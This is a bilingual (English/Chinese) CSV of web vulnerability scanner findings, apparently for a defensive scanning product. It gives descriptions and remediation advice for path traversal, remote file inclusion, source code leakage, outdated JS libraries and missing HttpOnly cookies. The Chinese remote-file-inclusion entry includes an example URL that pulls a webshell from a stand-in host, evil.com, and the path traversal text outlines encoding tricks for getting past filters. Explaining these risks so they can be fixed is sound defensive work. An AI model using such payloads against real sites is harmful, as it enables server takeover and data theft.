id,type,origin,enabled,risk,cost,name_en,name_zh,desc_en,desc_zh,advice_en,advice_zh
0,A1,Directory Browsing,TRUE,,,,,,,,
2,A1,Private IP Disclosure,TRUE,,,,,,,,
3,A1,Session ID in URL Rewrite,TRUE,,,,,,,,
6,A1,Path Traversal,TRUE,High,Medium,Directory Traversal,路徑遍尋,"We detected that your website is vulnerable to dirctory traversal.
 A directory traversal attack allows an attacker access to arbritrary restricted files directories and sensitive commands by manipulating a url. Any device that exposes an http-based interface is potentially vulnerable to path traversal. This vulnerability allows attackers to read sensitive information within the websites restricted files, and may lead to data exposure, credential leakage, and accont compromise. Attackers may utilize special-characters sequences, for example the ../ special-character sequence, to alter the resource location requested in the url. Advanced information： Although most popular web servers will prevent this technique with security filters, attackers may bypass them using alternate encodings, including unicode-encoded slash characters, url encoded characters, and double url encodings. Even if the web server properly restricts path traversal attempts in the url path, a web application may still be vulnerable due to improper handling of user-supplied input, such as substituting the original url parameter value with the file name of one of the web application's dynamic scripts. Consequently the results can reveal source code because the file is interpreted as text instead of an executable script. These techniques often employ additional special characters such as the dot (.) to reveal the listing of the current working directory or %00 null characters in order to bypass rudimentary file extension checks.","檢測到您的網站有被路徑遍尋攻擊的可能。
​此攻擊會導致攻擊者訪問未開放的隱私路徑，使網站邏輯或是隱私洩露，常見於洩漏index目錄中的logs文件內容導致揭露使用者資訊及系統資訊，進而產生一系列如帳號列舉等攻擊。​ 路徑遍尋攻擊是使攻擊者可以訪問位於Web根目錄之外的文件目錄和命令，能以特定方式操縱URL，使網站可以執行或顯示Web服務器上任何位置的任意文件的內容，最基本的路徑遍歷攻擊是使用 ../ 特殊字符序列來更改url中請求的資源位置。","• When evaluating request parameters, use a whitelist of acceptable inputs and reject any input that does not strictly conform to specifications. Use blacklists to detect potential attacks or reject malformed inputs. Do not rely exclusively on blacklist.
•During input validation, consider all relevant properties including length, type of input, syntax consistency, and conformance to business rules.
• For filenames, limit the allowed character set and file extensions, and exclude directory separators such as /. 
• Make sure that your application does not decode the same input twice. 
• Run your code using the lowest privileges that are required, and in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This ensures that high privileged actions are prohibited even when an attacker has compromised an account.""","• 使用嚴格符合規範的白名單，拒絕任何不符合規範的輸入。 ​
• 在執行輸入驗證時，請考慮所有可能相關的屬性，包括輸入的長度、類型等。​
• 對於文件名，限制允許的字符集和文件擴展名，並排除目錄分隔符，例如 /。
• 確保您的應用程序不會對相同的輸入進行兩次解碼。
• 如果可能，請創建僅用於單個任務的具有有限的特權的隔離帳戶，即使攻擊者成功獲取該權限，也無法立即訪問網頁的其餘需較高權限部分或其環境。"""
7,A3,Remote File Inclusion,TRUE,High,,Remote File Inclusion,文件引用（遠端文件）,"Remote File Include (RFI) is an attack technique used to exploit “dynamic file include” mechanisms in web applications. When web applications take user input (URL, parameter value, etc.) and pass them into file include
 commands, the web application might be tricked into including remote files with malicious code. Almost all web application frameworks support file inclusion. File inclusion is mainly used for packaging common code into separate files that are later referenced by main application modules. When a web application references an include file, the code in this file may be executed implicitly or explicitly by calling specific procedures. If the choice of module to load is based on elements from the HTTP request, the web application might be vulnerable to RFI. An attacker can use RFI for： * Running malicious code on the server： any code in the included malicious files will be run by the server. If the file include is not executed using some wrapper, code in include files is executed in the context of the server user. This could lead to a complete system compromise. * Running malicious code on clients： the attacker's malicious code can manipulate the content of the response sent to the client. The attacker can embed malicious code in the response that will be run by the client (for example, JavaScript to steal the client session cookies). PHP is particularly vulnerable to RFI attacks due to the extensive use of “file includes” in PHP programming and due to default server configurations that increase susceptibility to an RFI attack.",檢測到您的網站有引用遠程文件的風險，可能使您的網站中意外帶入有風險的文件，常見為網站遠程引用含有竊取用戶cookie的惡意程式文件。 遠程文件引用是網頁為了讓自身可以插入不在本地伺服器的文件而設定的功能，但因為設置及防護不足而導致使駭客有可乘之機。 攻擊範例可能如下：駭客將以下指令包含進網頁之中https：//example.com/index.php?page=https：//evil.com/uploads/webshell.txt 使雖然前面是正常引用的正常文件，卻被連結到惡意網站中。,"• Make sure that remote file references are disabled in the configuration, and if the Allow_url_include can be set to '0' in PHP. In addition, it is recommended that all inputs such as URLs need to be validated before passing the data","• 確保程式語言的配置中禁用遠程文件引用，且若是在
PHP中可以allow_url_include設置為'0'。 此外，建議所有的輸入，例如：URL 需進行驗證，才將資料進行傳遞。"""
41,A5,Source Code Disclosure - Git ,TRUE,,,,,,,,
42,A5,Source Code Disclosure - SVN,TRUE,Medium,Low,Source SVN Leakage,SVN原始碼揭露,The source code for the current page was disclosed by the web server .,"檢測到您的網站可能有SVN原始碼洩露的風險。 
此風險會導致駭客獲取Server的原始碼甚至SVN Server上的帳號密碼。 通常風險的發生原因是因為在網站部署時未將程式碼匯出，導致不小心直接將所有SVN部署資訊及敏感資料送至外部。 ",• Ensure that SVN metadata files are not deployed to the web server or application server,"• 確認網站上無.svn/entries的檔案以及設定不允許使用者嘗試在URL輸入此字尾 。
• 設定完成後以報告中路徑測試，再次確認使用者無法存取檔案。"
43,A5,Source Code Disclosure - File Inclusion,TRUE,High,High,Source File Leakage,原始碼揭露,"We detected that your website leaks source code using local file inclusion. Source code often contains some form of sensitive information, such as configuration-related information (e.g. database credentials), username, passwords, or the internal workings and business logic of the web application. If source code files are disclosed, an attacker may use such information to discover logical flaws or obtain account information from databases or administrative panels. This may escalate to a chain of attacks, including SQL Injection, database takeovers, and remote code execution which would lead to data leakage, malware infections, or service denial.","檢測到您的網站可能有原始碼揭露的問題。​
如果公開原始碼文件，攻擊者可能使用此類的信息來發現邏輯缺陷，​例如密碼邏輯或是正規式漏洞導致攻擊者可以依據文件中漏洞縮小密碼列舉範圍、執行SQL注入、資料庫接管或遠程代碼執行等一系列攻擊。​ 原始碼通常包含某些形式的敏感信息，例如與配置相關的信息（例如資料庫憑證），或是Web應用程序工作方式的信息。","• Confirm exactly what aspects of the source code are actually disclosed and determine if it is necessary 
• If a file is required by the application, change its permissions to prevent public users from accessing it. Otherwise, remove it from the web server. 
• Remove all temporary and backup files from the web server.""","• 確認揭露的原始碼是否需要公開。​ 
• 如果應用程序需要這些文件，請更改權限禁止公開存取該文件，否則，請從Web伺服器中將其刪除。​ 
• 從Web伺服器上刪除所有臨時和備份文件。"
10003,A6,Vulnerable JS Library,TRUE,High,High,Vulnerable JS Library,有漏洞的JS函式庫,,"檢測到您的網站使用有已知漏洞的 JS 函式庫版本。
駭客可以利用此版本的弱點對您的服務進行攻擊。",,"• 請使用最新版本函式庫(jQuery 3.5.0以上版本)。
程式或框架中，若有使用到第三方資源，則需特別注意引用的版本是否安全，定期更新使用最新版本或無漏洞之穩定版本。"
10010,A5,Cookie No HttpOnly Flag,TRUE,Low,Low,Misconfigured Cookie： Missing HttpOnly Attribute,標頭配置錯誤（缺少 HttpOnly 屬性）,"A cookie has been set without the HttpOnly flag, which means that the cookie can be accessed by JavaScript. If a malicious script can be run on this page then the cookie will be accessible and can be transmitted to another site. If this is a session cookie then session hijacking may be possible.",檢測到您的網站在標頭中缺少HttpOnly屬性，該屬性可用來會限制cookie只能經由 HTTP(S)協定來存取。因此當網站有XSS弱點時，若cookie含有HttpOnly flag，則攻擊者無法直接經由JavaScript存取使用者的session cookie，可降低使用者身份被盜用的機率。 針對跨網站偽造要求的攻擊(cross-site request forgery attacks)作保護。,Ensure that the HttpOnly flag is set for all cookies.,• 以Java設置HttpOnly為例，可以在WEB-INF/web.xml進行設定 <session-config> <cookie-config> <http-only>true</http-only> </cookie-config> </session-config> 即可設置HttpOnly於session cookie。
